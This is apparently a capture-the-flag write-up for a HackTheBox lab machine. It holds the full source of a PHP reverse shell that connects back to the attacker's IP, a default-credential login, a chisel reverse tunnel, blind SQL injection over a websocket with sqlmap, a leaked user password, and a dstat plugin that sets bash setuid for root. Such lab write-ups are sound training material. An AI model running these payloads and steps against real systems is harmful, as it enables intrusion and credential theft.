## Tools: Chisel, Sqlmap, Dstat

## Vulnerabilities: 


```console
└─$ nmap -A -p- -T4 -Pn 10.10.11.194
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 11:00 CST
Nmap scan report for 10.10.11.194
Host is up (0.063s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Fri, 23 Dec 2022 17:11:42 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Fri, 23 Dec 2022 17:11:42 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Fri, 23 Dec 2022 17:11:43 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=12/23%Time=63A5E148%P=x86_64-pc-linux-gnu%r(i
SF:nformix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
SF:r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r
SF:\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-O
SF:ptions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC
SF:ontent-Length:\x20139\r\nDate:\x20Fri,\x2023\x20Dec\x202022\x2017:11:42
SF:\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lan
SF:g=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n<
SF:/head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(H
SF:TTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Po
SF:licy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143
SF:\r\nDate:\x20Fri,\x2023\x20Dec\x202022\x2017:11:42\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<m
SF:eta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>
SF:Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"H
SF:TTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-
SF:src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Fri,
SF:\x2023\x20Dec\x202022\x2017:11:43\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"
SF:utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS
SF:\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2
SF:F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")
SF:%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec
SF:tion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 703.69 seconds
```

Feroxbuster reveals a page we can access ```/tiny```

```console
└─$ feroxbuster -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x txt,html,php,pdf,git -q
200      GET      147l      526w     6917c http://soccer.htb/
403      GET        7l       10w      162c http://soccer.htb/.html
200      GET      147l      526w     6917c http://soccer.htb/index.html
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
403      GET        7l       10w      162c http://soccer.htb/tiny/.html
Scanning: http://soccer.htb
Scanning: http://soccer.htb/
Scanning: http://soccer.htb/tiny
Scanning: http://soccer.htb/tiny/uploads
```

Navigating to the page presents us with a login page.

![image](https://user-images.githubusercontent.com/105310322/209409258-5e8be53a-71cf-435a-9a41-949e4411ed9d.png)


A quick lookup shows some default creds we can use

https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management

admin/admin@123

Next we are presented with an upload section. Pretty simply lets upload a php reverse shell.

![image](https://user-images.githubusercontent.com/105310322/209409232-de3cfaff-8e8a-4a06-b31e-c5af6a123980.png)



I used pentest monkeys php shell.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.11';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
After uploading set up your listener and access the shell from the webpage.

Note: These files will be deleted soon after.


```console
└─$ nc -lvnp 443                                 
listening on [any] 443 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.11.194] 35764
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 17:26:29 up 26 min,  0 users,  load average: 0.46, 0.45, 0.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@soccer:/$ 
```
After some enumeration I wanted to checkout some of the internal ports that were running. So i set up a chisel server to reverse it.

```console
www-data@soccer:/dev/shm$ ./chisel client 10.10.16.11:1234 R:3000:127.0.0.1:3000
<hisel client 10.10.16.11:1234 R:3000:127.0.0.1:3000
2022/12/23 18:12:46 client: Connecting to ws://10.10.16.11:1234
2022/12/23 18:12:46 client: Connected (Latency 30.676047ms)

```console
└─$ chisel server --reverse --port 1234
2022/12/23 12:12:08 server: Reverse tunnelling enabled
2022/12/23 12:12:08 server: Fingerprint aYgUqCouaLdiJjoEjQnS59ia9HOKjAsGun6Vbfhz/mU=
2022/12/23 12:12:08 server: Listening on http://0.0.0.0:1234
2022/12/23 12:12:46 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/12/23 12:12:46 server: session#1: tun: proxy#R:3000=>3000: Listening
```
After it was setup I could access the webpage.

It was almost identical except it had another login page, signups, and tickets.

So create a login. You can google temp email sites for a throwaway email.

Feroxbuster also revealed different capitalizations for the directories.

```console
└─$ feroxbuster -u http://soc-player.soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x txt,html,php,pdf,git -q
301      GET       10l       16w      173c http://soc-player.soccer.htb/css => /css/
301      GET       10l       16w      171c http://soc-player.soccer.htb/js => /js/
302      GET        1l        4w       23c http://soc-player.soccer.htb/logout => /
200      GET       98l      216w     3307c http://soc-player.soccer.htb/login
200      GET      157l      535w     6749c http://soc-player.soccer.htb/
301      GET       10l       16w      173c http://soc-player.soccer.htb/img => /img/
200      GET       98l      216w     3307c http://soc-player.soccer.htb/Login
200      GET      104l      229w     3741c http://soc-player.soccer.htb/signup
200      GET        1l        6w       31c http://soc-player.soccer.htb/check
200      GET      403l      706w    10078c http://soc-player.soccer.htb/match
200      GET      104l      229w     3741c http://soc-player.soccer.htb/Signup
200      GET      104l      229w     3741c http://soc-player.soccer.htb/SignUp
200      GET        1l        6w       31c http://soc-player.soccer.htb/Check
200      GET       98l      216w     3307c http://soc-player.soccer.htb/LOGIN
200      GET      403l      706w    10078c http://soc-player.soccer.htb/Match
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_soc-player_soccer_htb-1671827892.state ...
Scanning: http://soc-player.soccer.htb
Scanning: http://soc-player.soccer.htb/css
Scanning: http://soc-player.soccer.htb/js
Scanning: http://soc-player.soccer.htb/
Scanning: http://soc-player.soccer.htb/img
```    

![image](https://user-images.githubusercontent.com/105310322/209409342-d980c733-a09c-4fda-b557-47403f349e10.png)



If we check out the source code for the ```Check``` page we can see it has another open socket and is also another domain. So I went ahead and added this to my hosts file.


```json
<script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
```

If you are able to capture a ticket response in burp then the output of the websocket will look like this. (It was really inconsistent and did not always work, Also I made sure I was on the "Check" webpage. Captilization matters"

```json
{"id":"85285"}
```
After messing around a bit and not having luck with my own union select I googled some about it and found this webpage.

https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

Take their script and add the websocket we found and change the data type to id.

Should look something like this.
```python
ws_server = "ws://soc-player.soccer.htb:9091"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message
```
Now run the script.

```console
-─$ python3 soccer.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```
In another console run sqlmap with ```sqlmap -u "http://localhost:8081/?id=1" -p "id" --dump-all --batch --time-sec 10```

It takes awhile and I ran into alot of issues. Likely from all the other players on the same machine and the resets happening.

If you are having trouble just run it a few times until it works.

```console
[14:53:33] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 98 HTTP(s) requests:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7135 FROM (SELECT(SLEEP(5)))AeFX)
```

PlayerOftheMatch2022

```console
└─$ ssh player@soccer.htb              
The authenticity of host 'soccer.htb (10.10.11.194)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Last login: Fri Dec 23 20:54:10 2022 from 10.10.14.111
-bash-5.0$ id
uid=1001(player) gid=1001(player) groups=1001(player)
```
```console
-bash-5.0$ cat user.txt
24cf****************************
```
Running linpeas does reveal dstat which is almost the same as sudo.

```console
player@soccer:~$ ls -la /usr/bin/dstat 
-rwxr-xr-x 1 root root 97762 Aug  4  2019 /usr/bin/dstat
```
```console
player@soccer:~$ cat dstat_exploit.py 
import os

os.system('chmod +s /usr/bin/bash')
```

```console
player@soccer:~$ cp dstat_exploit.py /usr/local/share/dstat/
player@soccer:~$ ls -la /usr/local/share/dstat/
total 12
drwxrwx--- 2 root   player 4096 Dec 23 21:39 .
drwxr-xr-x 6 root   root   4096 Nov 17 09:16 ..
-rw-rw-r-- 1 player player   47 Dec 23 21:39 dstat_exploit.py
player@soccer:~$ dstat --list | grep exploit
        exploit
```

```console
player@soccer:~$ doas -u root /usr/bin/dstat --exploit
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
Module dstat_exploit failed to load. (name 'dstat_plugin' is not defined)
None of the stats you selected are available.
```

```console
player@soccer:~$ bash -p
bash-5.0# cat /root/root.txt
ac6b****************************
```

